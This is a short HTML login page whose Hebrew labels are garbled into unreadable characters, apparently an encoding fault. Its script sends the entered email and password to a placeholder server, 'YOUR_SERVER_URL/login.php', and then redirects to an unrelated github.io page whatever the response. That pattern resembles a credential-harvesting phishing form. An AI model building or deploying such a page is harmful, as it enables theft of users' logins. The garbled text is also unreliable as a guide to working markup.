<!DOCTYPE html>
<html lang="he">
<head>
  <meta charset="UTF-8">
  <title>Login</title>
</head>
<body>
  <h2>转专转</h2>
  <form id="loginForm">
    <input type="email" id="email" placeholder="" required><br>
    <input type="password" id="password" placeholder="住住" required><br>
    <button type="submit">转专</button>
  </form>

  <script>
    document.getElementById('loginForm').addEventListener('submit', function(e) {
      e.preventDefault();
      const email = document.getElementById('email').value;
      const password = document.getElementById('password').value;

      fetch('https://YOUR_SERVER_URL/login.php', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ email, password })
      })
      .then(() => {
        // 专注 砖砖 爪, 注专 转转 砖
        window.location.href = "https://itapita470.github.io/itapitascompare.com";
      })
      .catch(error => {
        alert("转 砖 砖 ");
        console.error(error);
      });
    });
  </script>
</body>
</html>
